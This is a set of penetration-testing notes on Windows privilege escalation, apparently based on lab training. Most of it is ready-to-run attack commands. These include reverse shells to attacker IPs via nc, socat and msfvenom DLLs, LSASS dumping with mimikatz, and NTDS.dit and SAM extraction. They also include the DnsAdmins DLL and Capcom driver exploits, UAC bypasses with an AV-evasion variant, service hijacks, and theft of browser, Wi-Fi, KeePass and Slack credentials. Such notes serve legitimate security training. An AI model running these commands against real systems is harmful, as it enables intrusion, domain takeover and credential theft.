# Content
- [Windows User Privileges](#windows-user-privileges)
  - [SeImpersonate and SeAssignPrimaryToken](#seimpersonate-and-seassignprimarytoken)
  - [SeDebugPrivilege](#sedebugprivilege)
    - [Dump Memory](#dump-memory)
    - [RCE](#rce)
  - [SeTakeOwnershipPrivilege](#setakeownershipprivilege)
    - [Take onwership](#take-onwership)
- [Windows Group Privileges](#windows-group-privileges)
  - [Backup Operators](#backup-operators)
    - [Copying a Protected File](#copying-a-protected-file)
    - [Attacking a Domain Controller - Copying NTDS.dit](#attacking-a-domain-controller---copying-ntdsdit)
  - [Event Log Readers](#event-log-readers)
    - [read logs](#read-logs)
  - [DnsAdmins](#dnsadmins)
    - [RCE](#rce-1)
    - [Disabling the Global Query Block List](#disabling-the-global-query-block-list)
  - [Print Operators](#print-operators)
    - [RCE: Manual way GUI](#rce-manual-way-gui)
    - [RCE: Manual way no GUI](#rce-manual-way-no-gui)
    - [RCE: Automated](#rce-automated)
  - [Server Operators](#server-operators)
    - [RCE](#rce-2)
- [User Account Control](#user-account-control)
  - [GUI UAC Bypass](#gui-uac-bypass)
  - [No GUI UAC Bypass](#no-gui-uac-bypass)
- [Weak Permissions](#weak-permissions)
  - [Weak File System Permissions](#weak-file-system-permissions)
  - [Weak Service Permissions](#weak-service-permissions)
  - [Unquoted Service Path](#unquoted-service-path)
  - [Weak Registry Permissions](#weak-registry-permissions)          
- [Kernal Exploits](#kernal-exploits)
- [Vulnerable Services](#vulnerable-services)
- [Credential Theft](#credential-theft)
- [Interacting with Users]()

# tools
- [winPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
- [PowerUp](https://github.com/BC-SECURITY/Empire/blob/main/empire/server/data/module_source/privesc/PowerUp.ps1)
- [Windows Exploit Suggester - Next Generation](https://github.com/bitsadmin/wesng)

# Windows User Privileges
- [list of User Rights and Privileges](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory#table-b-1-user-rights-and-privileges)
## SeImpersonate and SeAssignPrimaryToken

- Essentially, the Potato attack tricks a process running as SYSTEM to connect to their process, which hands over the token to be used and gain NT AUTHORITY\SYSTEM level access.
- We will often run into this privilege after gaining remote code execution via an application that runs in the context of a service account (for example, uploading a web shell to an ASP.NET web application, achieving remote code execution through a Jenkins installation, or by executing commands through MSSQL queries).
- tools
  - [JuicyPotato](https://github.com/ohpe/juicy-potato). JuicyPotato doesn't work on `Windows Server 2019` and `Windows 10 build 1809 onwards`.
  - [PrintSpoofer](https://github.com/itm4n/PrintSpoofer). work on Windows 10 and Server 2016/2019.
  - [RoguePotato](https://github.com/antonioCoco/RoguePotato). 

### check 
```powershell
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled    
```


### PrintSpoofer
```powershell
c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"

```

## SeDebugPrivilege
- To run a particular application or service or assist with troubleshooting, a user might be assigned the SeDebugPrivilege instead of adding the account into the administrators group.
- it can be used to capture sensitive information from system memory, or access/modify kernel and application structures.



### check
```
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeDebugPrivilege                          Debug programs                                                     Enabled
```

### Dump Memory
```powershell
procdump.exe -accepteula -ma lsass.exe lsass.dmp

mimikatz.exe "log" "privilege::debug" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords" exit
```

### RCE
-  If we target a parent process running as SYSTEM (specifying the Process ID (or PID) of the target process or running program), then we can elevate our rights quickly
- [psgetsystem](https://github.com/decoder-it/psgetsystem)




```powershell
# get a listing of running processes and accompanying PIDs.
tasklist 

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          4 K
System                           4 Services                   0        116 K
smss.exe                       340 Services                   0      1,212 K
csrss.exe                      444 Services                   0      4,696 K
wininit.exe                    548 Services                   0      5,240 K
csrss.exe                      556 Console                    1      5,972 K
winlogon.exe                   612 Console                    1     10,408 K

# we can target winlogon.exe running under PID 612, which we know runs as SYSTEM on Windows hosts.
Import-Module .\psgetsys.ps1 

ImpersonateFromParentPid -ppid <parentpid> -command <command to execute> -cmdargs <command arguments>
```

## SeTakeOwnershipPrivilege
- SeTakeOwnershipPrivilege grants a user the ability to take ownership of any "securable object," meaning Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes.
- This privilege assigns WRITE_OWNER rights over an object, meaning the user can change the owner within the object's security descriptor.

### check 
```powershell

whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
```

### Take onwership 

```powershell
# check ownership of a file
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
cmd /c dir /q 'C:\Department Shares\Private\IT'

# check owenrship of a user in AD
$user = Get-ADUser -Identity "username" -Properties * # Replace 'username' with the actual username
$objectGUID = $user.ObjectGUID
$ADsPath = "LDAP://<GUID=$objectGUID>"
$userObject = [ADSI]$ADsPath
$owner = $userObject.psbase.ObjectSecurity.GetOwner([System.Security.Principal.NTAccount])
Write-Output "Owner: $owner"



# Taking Ownership of the File
takeown /f 'C:\Department Shares\Private\IT\cred.txt'

# Modifying the File ACL
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F

# Reading the File
cat 'C:\Department Shares\Private\IT\cred.txt'

```

### Files of Interest
```
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```

# Windows Group Privileges
- [listing of all built-in Windows groups](https://ss64.com/nt/syntax-security_groups.html)

## Backup Operators
-  Membership of this group grants its members the `SeBackup` and `SeRestore` privileges.
-  The `SeBackupPrivilege` allows us to traverse any folder and list the folder contents. 
- Note: Based on the server's settings, it might be required to spawn an elevated CMD prompt to bypass UAC and have this privilege.
- This group also permits logging in locally to a domain controller. this can be used to copy `NTDS.dit`
- [poc SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege)


### check
```powershell
whoami /priv
whoami /groups

Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

# check if SeBackup is enabled of disabled
Get-SeBackupPrivilege

# enable SeBackup
Set-SeBackupPrivilege
```

### Copying a Protected File
```powershell
# from `SeBackupPrivilegeCmdLets.dll`
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt

# using robocopy
robocopy /B 'C:\Confidential\' .\ '2021 Contract.txt'
```

### Attacking a Domain Controller - Copying NTDS.dit
- log in DC
- DiskShadow binary needs to executed from the C:\Windows\System32
```powershell
# beckup the NTDS.dit from DC
diskshadow.exe

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit

dir E:


# copy NTDS.dit file to read it
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit

# copy NTDS.dit file to read it using robocopy
robocopy /B E:\Windows\NTDS .\Tools ntds.dit
```

### Backing up SAM , Security and SYSTEM Registry Hives
- The privilege also lets us back up the SAM and SYSTEM registry hives, which we can extract local account credentials offline
```powershell
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

### Extracting Credentials
**Linux**
```powershell
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
**Windows** 
```powershell
Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```

## Event Log Readers
- members of the Event Log Readers group have permission to access system logs.
- can be used to read logs may contain passwords or hashes

### read logs
```powershell
# check joining to the group
net localgroup "Event Log Readers"

# Searching Security Logs Using wevtutil
wevtutil qe Security /rd:true /f:text | Select-String "/user"
# use as another user
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"


# Searching Security Logs Using Get-WinEvent
# Note: Searching the Security event log with Get-WInEvent requires administrator access or permissions adjusted on the registry key HKLM\System\CurrentControlSet\Services\Eventlog\Security.
# Membership in just the Event Log Readers group is not sufficient.
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```

## DnsAdmins
- Members of the DnsAdmins group have access to DNS information on the network.
- The Windows DNS service supports custom plugins and can call functions from them to resolve name queries that are not in the scope of any locally hosted DNS zones.
- DnsAdmins group doesn't give the ability to restart the DNS service, but this is conceivably something that sysadmins might permit DNS admins to do.
-  Membership in this group gives us the rights to disable global query block security which can be used in Creating a WPAD (Web Proxy Automatic Discovery Protocol) Record 

### check
```powershell
Get-ADGroupMember -Identity DnsAdmins
```

### RCE
- DNS management is performed over RPC
- ServerLevelPluginDll allows us to load a custom DLL with zero verification of the DLL's path. This can be done with the dnscmd tool from the command line
- When a member of the DnsAdmins group runs the dnscmd command below, the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` registry key is populated
- When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access)
- An attacker can load a custom DLL in context of `NT AUTHORITY\SYSTEM` in DC to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.

```powershell
# 1) Generating Malicious DLL , from linux 
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

# 2) send dll to windows victim

# 3) Loading Custom DLL
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

# 4) Checking Permissions on DNS Service
wmic useraccount where name="<username>" get sid

# RPWP permissions which translate to SERVICE_START and SERVICE_STOP, respectively.
sc.exe sdshow DNS
(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)

# 5) Restarting the DNS Service
sc.exe stop dns
sc.exe start dns

# 6) Confirming Registry Key Added and cleaning
reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll
```

### Disabling the Global Query Block List
- After disabling the global query block list and creating a WPAD record, every machine running WPAD with default settings will have its traffic proxied through our attack machine.
- We could use a tool such as Responder or Inveigh to perform traffic spoofing, and attempt to capture password hashes and crack them offline or perform an SMBRelay attack.
```powershell
# Disabling the Global Query Block List
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local

# Adding a WPAD Record
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```

## Print Operators
- Print Operators is another highly privileged group, which grants its members the `SeLoadDriverPrivilege`, rights to manage, create, share, and delete printers connected to a Domain Controller
- we can load a driver that can exec commands in DC like [Capcom.sys dirver](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys) 

### check
```powershell
whoami /priv

Privilege Name                Description                          State
============================= ==================================  ==========
SeLoadDriverPrivilege         Load and unload device drivers       Disabled
```


### RCE: Manual way GUI 
1) Compile this tool [EnableSeLoadDriverPrivilege](https://github.com/3gstudent/Homework-of-C-Language/blob/master/EnableSeLoadDriverPrivilege.cpp), add this lines in the top of the tool

```c
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"
```
then compile and send it to the victim
```powershell
cl.exe /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
```
run it to enable the `LoadDriverPrivilege` 
```powershell
EnableSeLoadDriverPrivilege.exe
```

2) add [Capcom.sys dirver](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys) to the registery 
```powershell
# The odd syntax \??\ used to reference our malicious driver's ImagePath is an NT Object Path.
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"

reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```
3) Verify Capcom Driver is Listed using [driverview](http://www.nirsoft.net/utils/driverview.html)
```powershell
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom
```
4) Use [ExploitCapcom Tool](https://github.com/tandasat/ExploitCapcom) to Escalate Privileges
```powershell
.\ExploitCapcom.exe
```
5) clean
```powershell
reg delete HKCU\System\CurrentControlSet\Capcom
```

### RCE: Manual way no GUI
- same steps in the prev
- If we do not have GUI access to the target, we will have to modify the ExploitCapcom.cpp code before compiling.
- Here we can edit line 292 and replace `C:\\Windows\\system32\\cmd.exe` with, say, a reverse shell binary created with msfvenom, for example: `c:\ProgramData\revshell.exe`.
```c
// Launches a command shell process
static bool LaunchShell()
{   
    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe"); // replace this line
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}

```

### RCE: Automated
- We can use a tool such as [EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/) to automate the process of enabling the privilege, creating the registry key, and executing NTLoadDriver to load the driver.
```powershel
.\EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys

.\ExploitCapcom.exe
```

## Server Operators
- The Server Operators group allows members to administer Windows servers without needing assignment of Domain Admin privileges.
- It is a very highly privileged group that can log in locally to servers, including Domain Controllers.
- Membership of this group confers the powerful `SeBackupPrivilege` and `SeRestorePrivilege` privileges and the ability to control local services.
- we can write a service bin path to exec code in context of `NT AUTHORITY\SYSTEM` in DC


### check
```powershell

# check service ex: AppReadiness run in which context
sc.exe qc AppReadiness

# Checking Service Permissions
PsService.exe security AppReadiness
sc.exe sdshow AppReadiness
```

### RCE
```powershell
# Modifying the Service Binary Path
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"

# start the service , it will fail do not worry about that it is normal
sc start AppReadiness

# Confirming Local Admin Group Membership
net localgroup Administrators

# from linux 
crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
```

# User Account Control
- [How User Account Control works](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works)
- [User Account Control settings and configuration](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/settings-and-configuration?tabs=intune)
- [My UAC notes](https://github.com/kiro6/penetration-testing-notes/tree/main/Operating%20Systems/Windows#user-account-control-uac)
- [The UACME project maintains a list of UAC bypasses](https://github.com/hfiref0x/UACME)
- From an attacker's perspective, the three lower UAC security levels are equivalent, and only the Always notify setting presents a difference.

## Check

```powershell

whoami /user
net localgroup administrators
whoami /priv



# Confirming UAC is Enabled
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

# Checking UAC Level
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin


# Checking Windows Version
[environment]::OSVersion.Version


# check the manifest for executables to find the autoElevate property
sigcheck64.exe -m c:/windows/system32/msconfig.exe | findstr "autoElevate"


```


## General Methdology
- most of the bypass techniques rely on us being able to leverage a High IL process to execute something on our behalf, Since any process created by a High IL parent process will inherit the same integrity level, this will be enough to get an elevated token without requiring us to go through the UAC prompt.



then we could check [UACME list](https://github.com/hfiref0x/UACME?tab=readme-ov-file#usage)


## GUI UAC Bypass


## technique number 55: GUI osk.exe or msconfig.exe
```
Author: James Forshaw

    Type: GUI Hack
    Method: UIPI bypass with token modification
    Target(s): \system32\osk.exe, \system32\msconfig.exe
    Component(s): Attacker defined
    Implementation: ucmTokenModUIAccessMethod
    Works from: Windows 7 (7600)
    Fixed in: unfixed 🙈
        How: -
    Code status: added in v3.1.5

```

### Exploit 
1) using run


![Screenshot 2024-07-23 at 10-47-11 TryHackMe Bypassing UAC](https://github.com/user-attachments/assets/3b302e6f-1250-4009-b2dc-f0f54ad3504f)

2) By navigating to the Tools tab, we can find an option to open cmd


![Screenshot 2024-07-23 at 10-47-25 TryHackMe Bypassing UAC](https://github.com/user-attachments/assets/c384c3ed-c60e-4e78-95bb-d62c02b06966)

3) press launch



## example: azman.msc 
1) using run


![Screenshot 2024-07-23 at 10-56-48 TryHackMe Bypassing UAC](https://github.com/user-attachments/assets/4d23210b-c977-493a-a237-0aad379dc179)

2) To run a shell, we will abuse the application's help


![Screenshot 2024-07-23 at 10-56-55 TryHackMe Bypassing UAC](https://github.com/user-attachments/assets/1d7fe324-d47a-41b9-a38e-e3b02e2ef52e)


3) On the help screen, we will right-click any part of the help article and select View Source


![Screenshot 2024-07-23 at 10-57-00 TryHackMe Bypassing UAC](https://github.com/user-attachments/assets/2ed07d4b-8b58-406d-bb57-fb36eb73433d)


4) go to `File->Open` and make sure to select `All Files` in the combo box on the lower right corner. Go to `C:\Windows\System32` and search for `cmd.exe` and right-click to select `Open`:


![Screenshot 2024-07-23 at 10-57-08 TryHackMe Bypassing UAC](https://github.com/user-attachments/assets/9ac539fe-1dcd-47d2-9b77-792260d24b2a)







## No GUI UAC Bypass

## technique number 54 example: SystemProperties*.exe Dll Hijack
**work on "Always Notify" level**

```
Author: egre55
Type: Dll Hijack
Method: Dll path search abuse
Target(s): \syswow64\SystemPropertiesAdvanced.exe and other SystemProperties*.exe
Component(s): \AppData\Local\Microsoft\WindowsApps\srrstr.dll
Implementation: ucmEgre55Method
Works from: Windows 10 (14393)
Fixed in: Windows 10 19H1 (18362)
  How: SysDm.cpl!_CreateSystemRestorePage has been updated for secured load library call



When attempting to locate a DLL, Windows will use the following search order.
1) The directory from which the application loaded.
2) The system directory C:\Windows\System32 for 64-bit systems.
3) The 16-bit system directory C:\Windows\System (not supported on 64-bit systems)
4) The Windows directory.
5) Any directories that are listed in the PATH environment variable.


```

### Exploit 
```powrershell

# Reviewing Path Variable
cmd /c echo %PATH%

# Generating Malicious srrstr.dll DLL (from linux)
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll

# deliver to victim host and place it in an PATH env

# Testing Connection
rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll

# Executing SystemPropertiesAdvanced.exe on Target Host
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe


```

## technique number 33: Fodhelper.exe

**do not work on "Always Notify" level**

```
    Type: Shell API
    Method: Registry key manipulation
    Target(s): \system32\fodhelper.exe
    Component(s): Attacker defined
    Implementation: ucmShellRegModMethod
    Works from: Windows 10 TH1 (10240)
    Fixed in: unfixed 🙈
        How: -
    Code status: added in v2.7.2

```

### Exploit 

```powershell

# cmd

set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"
reg add %REG_KEY% /v "DelegateExecute" /d "" /f
reg add %REG_KEY% /d %CMD% /f
fodhelper.exe


#clean
reg delete HKCU\Software\Classes\ms-settings\ /f
```

**Bypass AV detection**

```powershell
#cmd

# race condtion
set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"
reg add %REG_KEY% /v "DelegateExecute" /d "" /f
reg add %REG_KEY% /d %CMD% /f & fodhelper.exe
## clean
reg delete HKCU\Software\Classes\ms-settings\ /f


# different registry keys (src: https://v3ded.github.io/redteam/utilizing-programmatic-identifiers-progids-for-uac-bypasses) but this is the cmd version
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"
reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f
reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
fodhelper.exe

## clean
reg delete "HKCU\Software\Classes\.thm\" /f
reg delete "HKCU\Software\Classes\ms-settings\" /f

```

## technique number 34: Disk Cleanup Scheduled Task
```
Author: James Forshaw

    Type: Shell API
    Method: Environment variables expansion
    Target(s): \system32\svchost.exe via \system32\schtasks.exe
    Component(s): Attacker defined
    Implementation: ucmDiskCleanupEnvironmentVariable
    Works from: Windows 8.1 (9600)
    AlwaysNotify compatible
    Fixed in: Windows 10 (silent ninja patch, presumable May 2023 security bulletin)
        How: Shell API / Windows components update

```

### Exploit
```powershell
# cmd
reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4446 EXEC:cmd.exe,pipes &REM " /f
schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I

# clean
reg delete "HKCU\Environment" /v "windir" /f


```

# Weak Permissions

## tools
- [PowerUp](https://github.com/BC-SECURITY/Empire/blob/main/empire/server/data/module_source/privesc/PowerUp.ps1)
- [SharpUp](https://github.com/GhostPack/SharpUp)

```powershell
SharpUp.exe audit

```


## Weak File System Permissions
```powershell
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"

C:\Program Files (x86)\PCProtect\SecurityService.exe BUILTIN\Users:(I)(F)
                                                     Everyone:(I)(F)
                                                     NT AUTHORITY\SYSTEM:(I)(F)
                                                     BUILTIN\Administrators:(I)(F)
                                                     APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                     APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

## Replacing Service Binary with malicious binary 
cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
sc start SecurityService

```

## Weak Service Permissions
```powershell
# enum
SharpUp.exe audit ModifiableServices
# check
accesschk.exe /accepteula -quvcw WindscribeService

# Changing the Service Binary Path
sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
sc start WindscribeService
#clean
sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"

```

## Unquoted Service Path

In Windows, when a file path contains spaces and isn't enclosed within quotation marks, the operating system assumes the file's location based on these:
- C:\Program
- C:\Program Files
- C:\Program Files (x86)\System
- C:\Program Files (x86)\System Explorer\service\SystemExplorerService64


If we can create the following files, we would be able to hijack the service binary and gain command execution in the context of the service, in this case, `NT AUTHORITY\SYSTEM`.
- C:\Program.exe\
- C:\Program Files (x86)\System.exe

### Enum 
```powershell
# manual
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
# auto
SharpUp.exe audit UnquotedServicePath

```


### exploit
```
sc qc SystemExplorerHelpService

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: SystemExplorerHelpService
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```

## Weak Registry Permissions

```powershell
# enum
accesschk.exe /accepteula "username" -kvuqsw hklm\System\CurrentControlSet\services

>    RW HKLM\System\CurrentControlSet\services\ModelManagerService
>    KEY_ALL_ACCESS

Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"

sc start ModelManagerService


## Modifiable Registry Autorun Binary
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl

```

# Kernal Exploits 

### enum 
```powershell
systeminfo
wmic qfe list brief
Get-Hotfix
```

# Vulnerable Services
### enum 
```powershell
# Enumerating Installed Programs
wmic product get name

# Enumerating Installed Programs
$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize


# Enumerating Local Ports
netstat -ano | findstr 6064

# Enumerating Process ID
get-process -Id 3324

# Enumerating Running Service
get-service | ? {$_.DisplayName -like 'Druva*'}


```

# Credential Theft

### Saved Credentials
```powershell
cmdkey /list
runas /user:<domain>\<user> /savecred "COMMAND HERE"
runas /user:inlanefreight\bob /savecred "whoami"
```
- [SessionGopher](https://github.com/Arvanaghi/SessionGopher) searches for and decrypts saved login information for remote access tools like (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
- We need local admin access to retrieve stored session information. but it is always worth running as normal user
```powershell
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target WINLPE-SRV01
```

### Browser Credentials
- Retrieving Saved Credentials from Chrome
- [SharpChrome](https://github.com/GhostPack/SharpDPAPI?tab=readme-ov-file#sharpchrome-command-line-usage)
```powershell
.\SharpChrome.exe logins /unprotect
```

### Password Managers
- KeePass
- Some password managers such as `KeePass` are stored locally on the host. If we find a `.kdbx` file on a server, workstation, or file share, we know we are dealing with a KeePass database which is often protected by just a master password.
```powershell
keepass2john ILFREIGHT_Help_Desk.kdbx

hashcat -m 13400 keepass_hash /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

### Email
- If we gain access to a domain-joined system in the context of a domain user with a Microsoft Exchange inbox, we can attempt to search the user's email for terms such as "pass," "creds," "credentials," etc.
- [MailSniper](https://github.com/dafthack/MailSniper)
```powershell
# To search all mailboxes in a domain:
Invoke-GlobalMailSearch -ImpersonationAccount current-username -ExchHostname Exch01 -OutputCsv global-email-search.csv

# To search the current user's mailbox:
Invoke-SelfSearch -Mailbox current-user@domain.com
```

### Local creds 
- [LaZagne](https://github.com/AlessandroZ/LaZagne)
- [Search for local creds](https://github.com/kiro6/penetration-testing-notes/blob/main/Penetration%20Testing/Windows%20Privilege%20Escalation/Enumeration/README.md#creds)

### Windows AutoLogon
- The registry keys associated with Autologon can be found under `HKEY_LOCAL_MACHINE` in the following hive, and can be accessed by standard users
```powershell
# HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
# AdminAutoLogon - Determines whether Autologon is enabled or disabled. A value of "1" means it is enabled.
# DefaultUserName - Holds the value of the username of the account that will automatically log on.
# DefaultPassword - Holds the value of the password for the user account specified previously.

query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

```
> **Note:** If you absolutely must configure Autologon for your windows system, it is recommended to use Autologon.exe from the Sysinternals suite, which will encrypt the password as an LSA secret.


### Putty
- For Putty sessions utilizing a proxy connection, when the session is saved, the credentials are stored in the registry in clear text.
```powershell
# Computer\HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\<SESSION NAME>

# get sessions
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions

# query session
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```

### Wifi Passwords

```powershell
netsh wlan show profile
netsh wlan show profile <profilename> key=clear
```

### Abusing Cookies to Get Access to IM Clients

#### slack 
- there is cookie named `d`, which Slack uses to store the user's authentication token. If we can get our hands on that cookie, we will be able to authenticate as the user.
- check blogs [Abusing Slack for Offensive Operations](https://posts.specterops.io/abusing-slack-for-offensive-operations-2343237b9282) and [Phishing for Slack-tokens](https://thomfre.dev/post/2021/phishing-for-slack-tokens/)
- tool [SlackExtract](https://github.com/clr2of8/SlackExtract)

##### Cookie Extraction from Firefox
```powershell
# %APPDATA%\Mozilla\Firefox\Profiles\<RANDOM>.default-release

copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d
```

##### Cookie Extraction from Chromium-based Browsers
- [SharpChromium](https://github.com/djhohnstein/SharpChromium)
- [Invoke-SharpChromium](https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-SharpChromium.ps1)

```powershell


```
# Interacting with Users
### Process Command Lines
```powershell
while($true)
{

  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2

}
```

### Malicious SCF File
